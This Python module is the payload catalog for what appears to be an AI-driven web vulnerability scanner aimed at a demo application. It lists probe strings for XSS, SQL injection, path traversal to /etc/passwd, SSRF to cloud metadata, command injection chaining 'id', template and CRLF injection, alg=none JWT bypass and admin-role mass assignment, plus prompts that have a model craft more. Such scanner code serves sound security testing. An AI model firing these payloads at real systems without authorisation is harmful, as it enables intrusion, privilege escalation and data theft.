"""Single source of truth — every scan, attack technique, and payload style."""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Technique:
    name: str
    payload: str
    note: str
    style: str = ""


# Active attack techniques (probe payloads) — shared by autonomous + agent + checks
APPROACHES: dict[str, list[Technique]] = {
    "xss": [
        Technique("script_block", "<script>alert(1)</script>", "classic reflected script", "html_script"),
        Technique("img_onerror", '<img src=x onerror=alert(1)>', "event handler without script tags", "event_handler"),
        Technique("svg_onload", '"><svg/onload=alert(1)>', "attribute breakout into SVG", "attribute_breakout"),
        Technique("details_open", "<details open ontoggle=alert(1)>", "alternative HTML tag vector", "html_tag"),
    ],
    "sqli": [
        Technique("tautology", "' OR '1'='1", "boolean tautology — extra rows", "boolean"),
        Technique("error_quote", "'", "single quote — error-based signal", "error_based"),
        Technique("comment_bypass", "' OR 1=1--", "comment-terminated OR", "comment"),
        Technique("union_probe", "' UNION SELECT NULL--", "union column probe", "union"),
    ],
    "idor": [
        Technique("adjacent_id", "2", "next sequential object ID", "enumeration"),
        Technique("zero_id", "0", "zero / unset ID edge case", "edge_case"),
        Technique("admin_literal", "admin", "string ID instead of numeric", "string_id"),
        Technique("large_id", "9999", "out-of-range enumeration", "enumeration"),
    ],
    "redirect": [
        Technique("external_https", "https://evil.example/phish", "off-site HTTPS redirect", "external_url"),
        Technique("protocol_relative", "//evil.example/", "protocol-relative bypass", "protocol_relative"),
        Technique("javascript_uri", "javascript:alert(document.domain)", "javascript: scheme", "javascript_scheme"),
    ],
    "traversal": [
        Technique("etc_passwd", "../../../etc/passwd", "unix passwd via dot-dot", "dot_dot"),
        Technique("windows_ini", "..\\..\\windows\\win.ini", "windows path variant", "windows_path"),
        Technique("encoded_dots", "..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal", "url_encoded"),
    ],
    "ssrf": [
        Technique("ollama_internal", "http://127.0.0.1:11434/", "internal AI service", "internal_http"),
        Technique("self_health", "http://127.0.0.1:3000/health", "loopback same app", "loopback"),
        Technique("metadata", "http://169.254.169.254/latest/meta-data/", "cloud metadata IP", "cloud_metadata"),
        Technique("file_proto", "file:///etc/passwd", "file:// scheme probe", "file_scheme"),
    ],
    "cmdi": [
        Technique("semicolon_id", "127.0.0.1;id", "semicolon command chaining", "semicolon"),
        Technique("pipe_id", "127.0.0.1|id", "pipe to shell", "pipe"),
        Technique("backtick", "127.0.0.1`id`", "backtick execution", "backtick"),
        Technique("and_id", "127.0.0.1&&id", "AND chained command", "and_chain"),
    ],
    "ssti": [
        Technique("math_expr", "{{7*7}}", "template math evaluation", "mustache"),
        Technique("config_leak", "{{config}}", "config object leak probe", "object_leak"),
        Technique("string_builder", "${7*7}", "alternate template delimiter", "dollar_expr"),
    ],
    "crlf": [
        Technique("header_inject", "a%0d%0AX-Injected: evil", "CRLF into response headers", "header_inject"),
        Technique("set_cookie", "x%0d%0ASet-Cookie: evil=1", "cookie injection attempt", "cookie_inject"),
    ],
    "cors": [
        Technique("evil_origin", "https://evil.example", "untrusted origin reflection", "evil_origin"),
        Technique("null_origin", "null", "null origin bypass attempt", "null_origin"),
    ],
}

AUTH_JWT_TECHNIQUES: list[Technique] = [
    Technique("none_demo_admin", "", "alg=none with demo user + admin role", "alg_none"),
    Technique("none_admin_admin", "", "alg=none as admin user", "alg_none"),
]

AUTH_MASS_TECHNIQUES: list[Technique] = [
    Technique(
        "role_field",
        '{"username":"demo","password":"demo","role":"admin"}',
        "role field injection",
        "json_field",
    ),
    Technique(
        "boolean_priv",
        '{"username":"demo","password":"demo","isAdmin":true}',
        "boolean privilege field",
        "json_boolean",
    ),
    Technique(
        "username_swap",
        '{"username":"admin","password":"demo","role":"admin"}',
        "username swap with role",
        "json_swap",
    ),
]

PASSIVE_CHECKS: list[tuple[str, str]] = [
    ("check_security_headers", "missing security headers score"),
    ("check_csrf", "forms missing CSRF tokens"),
    ("check_sensitive_leak", "secrets in HTML/JSON responses"),
    ("check_clickjacking", "missing frame protection"),
    ("check_http_methods", "risky HTTP methods on API routes"),
]

SURFACE_MAP: dict[str, tuple[str, str, str]] = {
    "/search": ("xss", "/search", "q"),
    "/user": ("sqli", "/user", "id"),
    "/redirect": ("redirect", "/redirect", "url"),
    "/files": ("traversal", "/files", "name"),
    "/fetch": ("ssrf", "/fetch", "url"),
    "/ping": ("cmdi", "/ping", "host"),
    "/render": ("ssti", "/render", "template"),
    "/echo": ("crlf", "/echo", "msg"),
    "/api/cors": ("cors", "/api/cors", "Origin"),
}

PATH_MAP: dict[str, str] = {
    "/search": "q",
    "/user": "id",
    "/redirect": "url",
    "/files": "name",
    "/fetch": "url",
    "/ping": "host",
    "/render": "template",
    "/echo": "msg",
    "/api/cors": "Origin",
    "/api/admin": "Authorization",
    "/api/login": "body",
}

SKILL_CONFIG: dict[str, dict] = {
    "xss": {
        "keywords": ("xss", "cross-site", "cross site", "script tag", "onerror", "svg onload"),
        "defaults": {"path": "/search", "param": "q"},
        "probe_tool": "probe_xss",
        "instruction": "Craft reflected XSS — try script tags, event handlers, or attribute breakout.",
    },
    "sqli": {
        "keywords": ("sqli", "sql injection", "sqlinjection", "sql inject", "union select", "tautology"),
        "defaults": {"path": "/user", "param": "id"},
        "probe_tool": "probe_sqli",
        "instruction": "Craft SQLi — tautology, quote errors, comment bypass, or UNION.",
    },
    "redirect": {
        "keywords": ("open redirect", "redirect check", "url redirect", "protocol relative"),
        "defaults": {"path": "/redirect", "param": "url"},
        "probe_tool": "probe_redirect",
        "instruction": "Craft redirect payload — external URL, protocol-relative, or javascript: URI.",
    },
    "traversal": {
        "keywords": ("path traversal", "directory traversal", "lfi", "../", "dot dot"),
        "defaults": {"path": "/files", "param": "name"},
        "probe_tool": "probe_traversal",
        "instruction": "Craft path traversal — unix, windows, or URL-encoded dots.",
    },
    "jwt": {
        "keywords": ("jwt", "auth bypass", "token bypass", "alg none", "algorithm none"),
        "defaults": {"path": "/api/admin", "param": "Authorization"},
        "probe_tool": "probe_jwt",
        "instruction": "Craft JWT bypass token (alg:none admin) or leave empty for auto none-token.",
    },
    "idor": {
        "keywords": ("idor", "insecure direct", "object reference", "adjacent id"),
        "defaults": {"path": "/user", "param": "id"},
        "probe_tool": "probe_idor",
        "instruction": "Craft object ID — adjacent, zero, string admin, or large enumeration.",
    },
    "mass_assignment": {
        "keywords": ("mass assignment", "parameter tamper", "role injection", "isadmin"),
        "defaults": {"path": "/api/login", "param": "body"},
        "probe_tool": "probe_mass_assignment",
        "instruction": "Craft JSON login body with extra privileged fields.",
    },
    "cors": {
        "keywords": ("cors", "cross-origin", "access-control", "null origin"),
        "defaults": {"path": "/api/cors", "param": "Origin"},
        "probe_tool": "probe_cors",
        "instruction": "Craft evil Origin header value or null origin bypass.",
    },
    "ssrf": {
        "keywords": ("ssrf", "server-side request", "fetch url", "metadata", "file proto"),
        "defaults": {"path": "/fetch", "param": "url"},
        "probe_tool": "probe_ssrf",
        "instruction": "Craft internal URL — loopback, metadata IP, Ollama, or file://.",
    },
    "cmdi": {
        "keywords": ("command injection", "cmd injection", "cmdi", "os injection", "shell inject", "semicolon", "pipe id"),
        "defaults": {"path": "/ping", "param": "host"},
        "probe_tool": "probe_cmdi",
        "instruction": "Craft command injection — semicolon, pipe, backtick, or && chaining.",
    },
    "ssti": {
        "keywords": ("ssti", "template injection", "server-side template", "mustache", "{{"),
        "defaults": {"path": "/render", "param": "template"},
        "probe_tool": "probe_ssti",
        "instruction": "Craft template expression — {{7*7}}, {{config}}, or ${7*7}.",
    },
    "crlf": {
        "keywords": ("crlf", "header injection", "response splitting", "set-cookie inject"),
        "defaults": {"path": "/echo", "param": "msg"},
        "probe_tool": "probe_crlf",
        "instruction": "Craft CRLF injection into headers or Set-Cookie.",
    },
}

SEVERITY: dict[str, str] = {
    "xss": "high", "sqli": "high", "ssrf": "high", "cmdi": "high", "ssti": "high",
    "idor": "medium", "redirect": "medium", "traversal": "medium", "cors": "medium", "crlf": "medium",
    "jwt": "high", "mass_assignment": "high",
}


def techniques(category: str) -> list[Technique]:
    return list(APPROACHES.get(category, []))


def technique_names(category: str) -> list[str]:
    return [t.name for t in techniques(category)]


def get_technique(category: str, name: str) -> Technique | None:
    key = name.lower().replace("-", "_").replace(" ", "_")
    for t in techniques(category):
        if t.name == key or t.style == key:
            return t
    return None


def default_payload(category: str) -> str:
    items = techniques(category)
    return items[0].payload if items else ""


def all_payloads(category: str) -> list[str]:
    return [t.payload for t in techniques(category) if t.payload]


def resolve_technique(category: str, text: str) -> tuple[str, str] | None:
    """Match technique name/style mentioned in user text."""
    lower = text.lower().replace("-", "_")
    for t in techniques(category):
        if t.name in lower or (t.style and t.style in lower):
            return t.name, t.payload
    return None


def wants_all_variations(text: str) -> bool:
    lower = text.lower()
    hints = (
        "all variations", "all techniques", "all payloads", "all styles",
        "every variation", "every technique", "try all", "run all",
        "multiple payloads", "payload battery", "technique battery",
    )
    return any(h in lower for h in hints)


def format_techniques_for_prompt(category: str) -> str:
    lines = []
    for t in techniques(category):
        style = f" [{t.style}]" if t.style else ""
        preview = t.payload[:50] + ("..." if len(t.payload) > 50 else "")
        lines.append(f"  - {t.name}{style}: {preview} — {t.note}")
    if category == "jwt":
        for t in AUTH_JWT_TECHNIQUES:
            lines.append(f"  - {t.name} [{t.style}]: auto alg=none token — {t.note}")
    if category == "mass_assignment":
        for t in AUTH_MASS_TECHNIQUES:
            preview = t.payload[:50] + "..."
            lines.append(f"  - {t.name} [{t.style}]: {preview} — {t.note}")
    return "\n".join(lines) if lines else "  (none)"


def format_catalog_summary() -> str:
    lines = ["=== attack & scan catalog ===", ""]
    for cat in sorted(APPROACHES):
        cfg = SKILL_CONFIG.get(cat, {})
        tool = cfg.get("probe_tool", f"probe_{cat}")
        styles = ", ".join(t.style or t.name for t in APPROACHES[cat])
        lines.append(f"[{cat}] {tool} + check_{cat}")
        lines.append(f"  injection styles: {styles}")
        for t in APPROACHES[cat]:
            lines.append(f"    {t.name}: {t.note}")
        lines.append("")
    lines.append("[jwt] probe_jwt + check_auth_bypass")
    for t in AUTH_JWT_TECHNIQUES:
        lines.append(f"    {t.name}: {t.note}")
    lines.append("")
    lines.append("[mass_assignment] probe_mass_assignment")
    for t in AUTH_MASS_TECHNIQUES:
        lines.append(f"    {t.name}: {t.note}")
    lines.append("")
    lines.append("[passive]")
    for name, desc in PASSIVE_CHECKS:
        lines.append(f"    {name}: {desc}")
    lines.append("")
    lines.append("skill mode: craft <skill> [technique_name] — tries one or all variations")
    lines.append("cli: python cli.py probe --skill sqli --technique tautology")
    return "\n".join(lines).strip()


def check_with_variations(
    category: str,
    title: str,
    probe_fn,
    target: str,
    path: str,
    param: str,
    payload: str = "",
) -> str:
    """Run check_* with every catalog payload style until one hits."""
    payload_list = [payload] if payload else all_payloads(category)
    probes = []
    for pl in payload_list:
        result = probe_fn(target, path, param, pl)
        probes.append(result)
        if "vulnerable: True" in result:
            break
    vuln = [p for p in probes if "vulnerable: True" in p]
    lines = [
        f"=== {title} ===",
        f"target: {target}",
        f"styles tried: {len(payload_list)}",
        f"LIKELY VULNERABLE: {len(vuln)}",
        "",
    ]
    for block in probes:
        if "vulnerable: True" in block:
            for line in block.splitlines():
                if line.startswith(("request:", "signals:", "url:", "payload:", "location:")):
                    lines.append(f"  {line}")
    if not vuln:
        lines.append("  none found")
    return "\n".join(lines)


def build_probe_plan(category: str, user_line: str, model_payload: str = "") -> list[tuple[str, str]]:
    """Ordered payloads to try: named technique, model craft, then catalog escalation."""
    if category == "jwt":
        if wants_all_variations(user_line):
            return [(t.name, "") for t in AUTH_JWT_TECHNIQUES]
        named = resolve_technique(category, user_line)
        if named:
            return [named]
        return [(AUTH_JWT_TECHNIQUES[0].name, "")]

    if category == "mass_assignment":
        if wants_all_variations(user_line):
            return [(t.name, t.payload) for t in AUTH_MASS_TECHNIQUES]
        named = resolve_technique(category, user_line)
        if named:
            return [named]
        if model_payload:
            return [("model_crafted", model_payload)]
        return [(t.name, t.payload) for t in AUTH_MASS_TECHNIQUES]

    if wants_all_variations(user_line):
        return [(t.name, t.payload) for t in techniques(category) if t.payload]

    named = resolve_technique(category, user_line)
    if named:
        return [named]

    plan: list[tuple[str, str]] = []
    if model_payload:
        plan.append(("model_crafted", model_payload))
    for t in techniques(category):
        if t.payload and (t.name, t.payload) not in plan and ("model_crafted", t.payload) not in plan:
            plan.append((t.name, t.payload))
    return plan
